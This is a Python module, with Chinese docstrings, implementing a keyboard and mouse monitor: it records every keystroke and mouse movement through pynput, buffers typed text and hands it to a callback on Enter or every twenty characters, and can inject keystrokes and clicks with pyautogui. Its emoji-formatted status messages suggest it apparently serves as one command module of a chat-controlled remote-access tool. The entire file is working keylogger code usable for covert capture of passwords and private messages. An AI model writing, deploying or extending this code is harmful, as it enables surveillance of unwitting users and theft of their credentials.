#!/usr/bin/env python3
"""键盘记录"""
import threading
import time
from typing import Optional, Callable, List
from dataclasses import dataclass
from datetime import datetime

@dataclass
class InputEvent:
    timestamp: str
    type: str
    action: str
    details: str

class InputMonitor:
    """键盘鼠标监控"""

    def __init__(self):
        self.keylog_active = False
        self.mouselog_active = False
        self.events: List[InputEvent] = []
        self.callback: Optional[Callable] = None
        self._key_thread = None
        self._mouse_thread = None
        self._buffer = ""

    def start_keylog(self, callback=None) -> str:
        """启动键盘记录"""
        if self.keylog_active:
            return "⌨️ 键盘记录已在运行"

        self.keylog_active = True
        self.callback = callback

        def on_key_press(key):
            try:
                char = key.char
                self._buffer += char

                if len(self._buffer) > 100:
                    self._buffer = self._buffer[-50:]

                event = InputEvent(
                    timestamp=datetime.now().strftime("%H:%M:%S"),
                    type="key",
                    action="press",
                    details=char
                )
                self.events.append(event)

                if self.callback and (char in ['\n', '\r'] or len(self._buffer) % 20 == 0):
                    self.callback(self._format_buffer())

            except AttributeError:
                event = InputEvent(
                    timestamp=datetime.now().strftime("%H:%M:%S"),
                    type="key",
                    action="special",
                    details=str(key)
                )
                self.events.append(event)

        try:
            from pynput import keyboard
            listener = keyboard.Listener(on_press=on_key_press)
            listener.start()
            self._key_thread = listener
            return "⌨️ 键盘记录已启动"
        except Exception as e:
            self.keylog_active = False
            return f"❌ 启动失败: `{str(e)}`"

    def stop_keylog(self) -> str:
        """停止键盘记录"""
        self.keylog_active = False
        if self._key_thread:
            self._key_thread.stop()
        return "🛑 键盘记录已停止"

    def get_keylog(self, lines: int = 50) -> str:
        """获取键盘记录"""
        recent = self.events[-lines:] if self.events else []
        if not recent:
            return "暂无记录"

        formatted = []
        for e in recent:
            formatted.append(f"`[{e.timestamp}]` {e.type}:{e.action} `{e.details}`")

        return "⌨️ **键盘记录**\n━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(formatted)

    def start_mouselog(self) -> str:
        """启动鼠标监控"""
        if self.mouselog_active:
            return "🖱️ 鼠标监控已在运行"

        self.mouselog_active = True

        def on_move(x, y):
            event = InputEvent(
                timestamp=datetime.now().strftime("%H:%M:%S"),
                type="mouse",
                action="move",
                details=f"({x}, {y})"
            )
            self.events.append(event)

        def on_click(x, y, button, pressed):
            event = InputEvent(
                timestamp=datetime.now().strftime("%H:%M:%S"),
                type="mouse",
                action="click" if pressed else "release",
                details=f"({x}, {y}) {button}"
            )
            self.events.append(event)

        try:
            from pynput import mouse
            listener = mouse.Listener(on_move=on_move, on_click=on_click)
            listener.start()
            self._mouse_thread = listener
            return "🖱️ 鼠标监控已启动"
        except Exception as e:
            self.mouselog_active = False
            return f"❌ 启动失败: `{str(e)}`"

    def stop_mouselog(self) -> str:
        """停止鼠标监控"""
        self.mouselog_active = False
        if self._mouse_thread:
            self._mouse_thread.stop()
        return "🛑 鼠标监控已停止"

    def _format_buffer(self) -> str:
        return self._buffer

    def simulate_key(self, text: str) -> str:
        """模拟键盘输入"""
        try:
            import pyautogui
            pyautogui.typewrite(text, interval=0.01)
            return f"✅ 已输入: `{text[:50]}{'...' if len(text) > 50 else ''}`"
        except Exception as e:
            return f"❌ 模拟失败: `{str(e)}`"

    def simulate_click(self, x: int, y: int) -> str:
        """模拟鼠标点击"""
        try:
            import pyautogui
            pyautogui.click(x, y)
            return f"✅ 已点击: `({x}, {y})`"
        except Exception as e:
            return f"❌ 点击失败: `{str(e)}`"
